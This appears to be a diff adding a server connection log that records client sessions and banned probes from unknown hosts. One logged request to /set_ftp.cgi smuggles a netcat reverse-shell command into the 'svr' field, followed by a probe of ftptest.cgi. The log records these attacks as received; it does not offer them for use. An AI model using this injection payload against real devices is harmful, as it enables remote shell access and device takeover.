@@ -1,0 +1,30 @@
+Connection Successful - 
+Client on 94.236.227.19 with ID 0'Q2M4IHFTvx
+Client on 94.236.227.19 with ID 1'wJ0fulnuqb
+Client 0'Q2M4IHFTvx disconnected...
+Client on 94.236.227.19 with ID 0'NjT3GBmSdd
+Client on 94.236.227.19 with ID 2'C2epL8fxta
+Client 2'C2epL8fxta disconnected...
+Client 0'NjT3GBmSdd disconnected...
+Client on 94.236.227.19 with ID 2'ov7AS7usAv
+Client on 94.236.227.19 with ID 0'zjyOkDuvLP
+Client 2'ov7AS7usAv disconnected...
+Client on 50.65.204.214 with ID 2'iwcxO8UMFh
+Client on 50.65.204.214 with ID 3'UsXbpCI9s8
+Client 2'iwcxO8UMFh disconnected...
+unknown host attempted connection from IP: 137.184.99.240, ban counter: 2
+message: GET login.cgi HTTP/1.1
+
+
+unknown host attempted connection from IP: 205.185.120.71, ban counter: 1
+message: GET login.cgi HTTP/1.1
+
+
+unknown host attempted connection from IP: 205.185.120.71, ban counter: 2
+message: GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+205.185.120.71+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1
+
+
+unknown host attempted connection from IP: 205.185.120.71, ban counter: 3
+message: GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1
+
+
